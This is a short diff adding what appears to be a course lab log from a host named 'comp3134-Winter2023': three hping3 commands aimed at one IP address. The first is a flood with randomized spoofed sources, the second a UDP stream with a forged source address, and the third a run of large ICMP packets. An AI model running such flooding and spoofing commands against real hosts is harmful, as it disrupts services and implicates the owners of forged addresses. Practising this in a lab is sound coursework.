@@ -1,0 +1,5 @@
+root@comp3134-Winter2023:/var/www/html# hping3 137.184.172.1 -c 10000 --rand-source --flood
+
+root@comp3134-Winter2023:/var/www/html# hping3 137.184.172.1 --udp -c 9000 -i u90000 --spoof 70.50.114.115
+
+root@comp3134-Winter2023:/var/www/html# hping3 137.184.172.1 --icmp -c 11000 -d 1024 -i u75000 
